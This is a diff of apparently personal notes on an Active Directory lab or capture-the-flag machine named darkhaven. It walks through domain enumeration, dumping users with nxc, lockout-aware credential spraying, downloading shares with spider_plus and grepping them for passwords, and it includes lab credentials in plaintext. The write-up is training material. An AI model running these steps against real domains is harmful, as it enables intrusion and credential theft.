@@ -1,4 +1,4 @@
-- We are first enumerating the machine web.ext.darkhaven.local
+ - We are first enumerating the machine web.ext.darkhaven.local
 - start off with rustscan
 ```python
 rustscan -a <ip> -- -A
@@ -199,5 +199,48 @@ upload /home/tyler/hacksmarter/darkhaven/Sharphound.exe C:/Users/Administrator/D
 ```python
 .\SharpHound.exe All
 ```
+- That too didn't work :)
 
+#### Trying manual enumeration with the nt authority session
+```python
+execute -o net group 'Domain Admins' /domain
+```
+![[Pasted image 20260831060507.png]]
+- we see that if we can compromise ldap_svc ew have keys to the kingdom
+#### Looking at the creds that we had from keepass
+- we see that some of the users are indeed domain users
+- we can try doing password spraying after getting all the users using `nxc`
+**Command to check if the user is a domain user : **
+```python
+execute -o net user showard /domain
+```
 
+#### Password spraying
+1. Retrieve the password policy
+```python
+execute -o net accouts /domain
+```
+![[Pasted image 20260831061437.png]]
+2. dumping all the domain users using nxc
+```python
+nxc ldap dc.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!' --users-export users.txt
+```
+or
+```python
+nxc smb dc.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!' --users > users.txt
+```
+**Since the lockout threshould is 5, its not a good idea to password spray all the accounts since that will essentially lock out all the accounts**
+- just manually try each of the creds using nxc
+- we find that the creds, `showard` : `5rtfgvb^RTFGVB` works
+- checked what shares this user had access to, and then used nxc `spider_plus` module to download all the shares
+```python
+nxc smb share.ext.darkhaven.local -u 'showard' -p '5rtfgvb^RTFGVB' -M spider_plus --share Darkhavendata -o DOWNLOAD_FLAG=True
+```
+
+- we can use the `tree` command to get a high level view of the data.
+- and then use `grep` to check for interesting data
+```python
+grep -ir "password" -C 10
+```
+
+and we got creds for a local admin account (video 7)
